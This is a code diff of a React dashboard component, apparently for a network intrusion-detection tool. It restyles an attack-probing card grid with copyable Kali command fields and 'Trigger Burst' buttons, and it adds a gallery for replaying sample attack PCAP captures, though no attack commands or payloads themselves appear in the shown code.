-      {/* SECTION 2: CUSTOM PCAP FILE UPLOAD */}
-      <div className="bg-[#0c0f17] border border-dashed border-slate-800 hover:border-blue-500/50 p-6 rounded-xl transition-colors text-center">
-        <Upload className="w-8 h-8 text-blue-400 mx-auto mb-2" />
-        <h4 className="text-sm font-bold text-white">Upload External PCAP Capture for Live Inspection</h4>
-        <p className="text-xs text-slate-400 mt-1 max-w-md mx-auto">
-          Upload any recorded network capture (.pcap, .pcapng). The Scapy ingestion adapter will extract directional flow windows and run real-time inference without mock data.
-        </p>
-        <label className="mt-4 inline-block cursor-pointer px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold rounded-lg transition-colors">
-          {uploading ? 'Parsing & Streaming PCAP...' : 'Select .PCAP File'}
-          <input type="file" accept=".pcap,.pcapng,.cap" onChange={handleFileUpload} disabled={uploading} className="hidden" />
-        </label>
-      </div>
-
-      {/* SECTION 3: RAW SOCKET TEST INJECTOR */}
-      <div className="space-y-3">
-        <div className="border-b border-slate-800 pb-2">
-          <h3 className="text-sm font-bold tracking-wider text-slate-300 uppercase flex items-center gap-2">
-            <Zap className="w-4 h-4 text-yellow-400" />
-            Active Raw Socket Simplex Probing Lab
-          </h3>
+      {/* 6-VECTOR RAW SOCKET PROBING GRID */}
+      <div className="space-y-3 pt-2">
+        <div className="flex items-center justify-between">
+          <h2 className="text-xs font-semibold uppercase tracking-wider text-zinc-400 font-mono flex items-center gap-2">
+            <Zap className="w-3.5 h-3.5 text-amber-400" />
+            Active Raw Socket Simplex Probing Lab (Vectors a-f)
+          </h2>
+          <span className="text-[11px] text-zinc-500 font-mono">Live kernel raw socket injection</span>
         </div>
 
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3.5">
           {ATTACKS.map((atk) => {
             const Icon = atk.icon
+            const isTrig = loading === atk.type
             return (
-              <div key={atk.type} className="rounded-xl border border-slate-800 bg-[#0c0f17] p-4 flex flex-col justify-between hover:border-slate-700 transition-all shadow-sm">
-                <div>
-                  <div className="flex items-center justify-between mb-2">
-                    <span className="text-[10px] font-bold font-mono px-2 py-0.5 rounded bg-blue-500/10 border border-blue-500/20 text-blue-400">
+              <Card key={atk.type} className="flex flex-col justify-between">
+                <CardHeader className="py-3 px-4">
+                  <div className="flex items-center justify-between">
+                    <span className="text-xs font-bold text-zinc-100 flex items-center gap-2">
+                      <Icon className="w-3.5 h-3.5 text-blue-400" />
+                      {atk.name}
+                    </span>
+                    <Badge variant={atk.variant} size="xs">
                       {atk.vector}
-                    </span>
-                    <span className="text-[10px] font-mono text-slate-500">
-                      {atk.metric}
-                    </span>
+                    </Badge>
                   </div>
-                  <div className="flex items-center gap-3 my-2">
-                    <div className="p-2 rounded-lg bg-slate-800/60 text-blue-400">
-                      <Icon className="w-5 h-5" />
-                    </div>
-                    <h4 className="text-sm font-semibold text-white">{atk.name}</h4>
+                </CardHeader>
+                <CardContent className="p-4 pt-2 space-y-3 text-xs">
+                  <p className="text-zinc-400 text-[11px] font-sans leading-relaxed">{atk.desc}</p>
+                  
+                  <div className="p-2 rounded bg-[#090b0e] border border-white/[0.06] flex items-center justify-between">
+                    <code className="text-[11px] text-zinc-300 truncate font-mono">{atk.kali}</code>
+                    <button
+                      onClick={() => copyKaliCmd(atk.kali)}
+                      className="text-zinc-500 hover:text-zinc-300 p-1 cursor-pointer"
+                      title="Copy Kali Command"
+                    >
+                      {copiedCmd === atk.kali ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
+                    </button>
                   </div>
-                  <div className="my-2">
-                    <span className="text-[10px] font-mono bg-purple-950/40 text-purple-300 border border-purple-800/60 px-2 py-0.5 rounded block truncate">
-                      Kali: {atk.kali}
-                    </span>
+
+                  <div className="flex items-center justify-between pt-1 border-t border-white/[0.06] text-[10px]">
+                    <span className="text-zinc-500 uppercase">{atk.metric}</span>
+                    <Button
+                      variant="outline"
+                      size="xs"
+                      loading={isTrig}
+                      onClick={() => triggerAttack(atk.type)}
+                      icon={<Play className="w-3 h-3 text-red-400" />}
+                    >
+                      Trigger Burst
+                    </Button>
                   </div>
-                  <p className="text-xs text-slate-400 leading-relaxed">{atk.desc}</p>
+                </CardContent>
+              </Card>
+            )
+          })}
+        </div>
+      </div>
+
+      {/* AUTHENTIC DEFENSE PCAP REPLAY GALLERY */}
+      <div className="space-y-3 pt-2">
+        <div className="flex items-center justify-between">
+          <h2 className="text-xs font-semibold uppercase tracking-wider text-zinc-400 font-mono flex items-center gap-2">
+            <FileCode className="w-3.5 h-3.5 text-blue-400" />
+            Authentic Attack PCAP Replay Pipeline (Zero-Simulation)
+          </h2>
+          <span className="text-[11px] text-zinc-500 font-mono">24 authentic defense captures</span>
+        </div>
+
+        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2.5">
+          {PCAP_SAMPLES.map((sample) => {
+            const isReplaying = loading === sample.name
+            return (
+              <div
+                key={sample.name}
+                className="p-3 rounded-lg border border-white/[0.08] bg-[#111318] hover:bg-white/[0.03] flex flex-col justify-between transition-colors"
+              >
+                <div>
+                  <div className="flex items-center justify-between mb-1">
+                    <Badge variant="neutral" size="xs">{sample.category}</Badge>
+                    <span className="text-[10px] text-zinc-500">{sample.size}</span>
+                  </div>
+                  <div className="text-xs font-bold text-zinc-200 mt-1 truncate">{sample.label}</div>
+                  <code className="text-[10px] text-zinc-500 font-mono block truncate mt-0.5">{sample.name}</code>
                 </div>
-                <button
-                  onClick={() => triggerAttack(atk.type)}
-                  disabled={loading !== null}
-                  className="mt-4 w-full py-2 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white rounded-lg text-xs font-bold font-mono transition-colors shadow flex items-center justify-center gap-2"
-                >
-                  {loading === atk.type ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5" />}
-                  {loading === atk.type ? 'Injecting Sockets...' : 'Launch Simplex Probe'}
-                </button>
+
+                <div className="mt-3 pt-2 border-t border-white/[0.06]">
+                  <Button
+                    variant="outline"
+                    size="xs"
+                    className="w-full"
+                    loading={isReplaying}
+                    onClick={() => triggerPcapReplay(sample.name)}
+                    icon={<Play className="w-3 h-3 text-blue-400" />}
+                  >
+                    Replay
+                  </Button>
+                </div>
               </div>
             )
           })}
